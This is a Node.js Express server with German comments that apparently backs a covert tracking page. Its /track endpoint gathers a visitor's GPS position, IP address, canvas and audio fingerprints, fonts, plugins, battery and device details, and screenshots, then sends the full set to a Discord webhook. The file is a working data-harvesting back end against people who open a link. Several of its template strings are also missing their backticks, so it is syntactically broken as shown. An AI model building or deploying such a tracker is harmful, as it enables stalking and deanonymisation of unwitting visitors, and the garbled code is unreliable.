// server.js — nur Discord, keine DB, KEINE IP-Geolocation
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

app.set('trust proxy', true);
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // Für größere Payloads (z. B. Screenshots)

// Static
const publicDir = path.join(__dirname, 'public');
app.use(express.static(publicDir));

// Health + Root
app.get('/health', (_, res) => res.send('ok'));
app.get('/', (_, res) => res.sendFile(path.join(publicDir, 'index.html')));

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// Echte Client-IP (nur Infozweck)
function getClientIp(req) {
  const xf = req.headers['x-forwarded-for'] || req.headers['x-real-ip'];
  if (xf) return String(xf).split(',')[0].trim().replace(/^::ffff:/, '');
  return (req.socket?.remoteAddress || '').replace(/^::ffff:/, '');
}

// Track – NUR Browser-Signale, erweitert
app.post('/track', async (req, res) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  const timestamp = new Date().toISOString();

  // Alles aus dem Body (POST für größere Daten wie Screenshots)
  const {
    request_id, lat, lon, accuracy, altitude, heading, speed, geo_status,
    language, languages, cookies, screen, window: win, timezone, platform,
    hardwareConcurrency, deviceMemory, connection, referrer, plugins, fonts,
    webgl, battery, canvas_fingerprint, audio_fingerprint, screenshot
  } = req.body;

  // Location NUR aus Browser (wenn vorhanden)
  const hasGPS = lat && lon;
  const locationText = hasGPS
    ? `Lat: ${lat}, Lon: ${lon}${accuracy ? ` (±${accuracy} m)` : ''}${altitude ? , Alt: ${altitude} m : ''}${heading ? , Heading: ${heading}° : ''}${speed ? , Speed: ${speed} m/s : ''}`
    : '–';

  // Discord Embed mit allen Daten
  const embeds = [{
    title: 'Tracking-Daten (Maximaler Datensatz)',
    color: 0x2b90d9,
    fields: [
      { name: 'Request ID', value: String(request_id || '–'), inline: true },
      { name: 'IP (Info)', value: String(ip || '–'), inline: true },
      { name: 'User-Agent', value: (userAgent || '–').slice(0, 256), inline: false },
      { name: 'Zeitzone', value: String(timezone || '–'), inline: true },
      { name: 'Referrer', value: String(referrer || '–').slice(0, 256), inline: false },
      { name: 'Geo Permission', value: String(geo_status || 'unbekannt'), inline: true },
      { name: 'Language(s)', value: String(language || languages || '–').slice(0, 256), inline: true },
      { name: 'Platform', value: String(platform || '–'), inline: true },
      { name: 'HW / RAM', value: Cores: ${hardwareConcurrency || '–'} | RAM: ${deviceMemory || '–'} GB, inline: true },
      { name: 'Screen', value: String(screen || '–').slice(0, 256), inline: false },
      { name: 'Window', value: String(win || '–').slice(0, 256), inline: false },
      { name: 'Netz', value: String(connection || '–').slice(0, 256), inline: false },
      { name: 'Plugins', value: String(plugins || '–').slice(0, 256), inline: false },
      { name: 'Fonts', value: String(fonts || '–').slice(0, 256), inline: false },
      { name: 'WebGL', value: String(webgl || '–').slice(0, 256), inline: false },
      { name: 'Battery', value: String(battery || '–').slice(0, 256), inline: false },
      { name: 'Canvas Fingerprint', value: String(canvas_fingerprint || '–').slice(0, 64), inline: true },
      { name: 'Audio Fingerprint', value: String(audio_fingerprint || '–').slice(0, 64), inline: true },
      { name: 'Location (GPS)', value: locationText, inline: false },
    ],
    timestamp
  }];

  // Screenshot als Bild-Attachment (falls vorhanden)
  if (screenshot) {
    embeds[0].image = { url: attachment://screenshot-${request_id || timestamp}.png };
  }

  if (DISCORD_WEBHOOK_URL) {
    try {
      await axios.post(DISCORD_WEBHOOK_URL, {
        content: 📡 **Neuer Track** — ${timestamp},
        embeds,
        attachments: screenshot ? [{
          filename: screenshot-${request_id || timestamp}.png,
          content: Buffer.from(screenshot.split(',')[1], 'base64')
        }] : []
      }, { timeout: 10000 });
    } catch (e) {
      console.error('Discord-Webhook-Fehler:', e.response?.status, e.response?.data || e.message);
    }
  } else {
    console.warn('Kein DISCORD_WEBHOOK_URL gesetzt – überspringe Discord-Post.');
  }

  res.send('Daten empfangen');
});

app.listen(port, () => console.log(Server läuft auf Port ${port}));
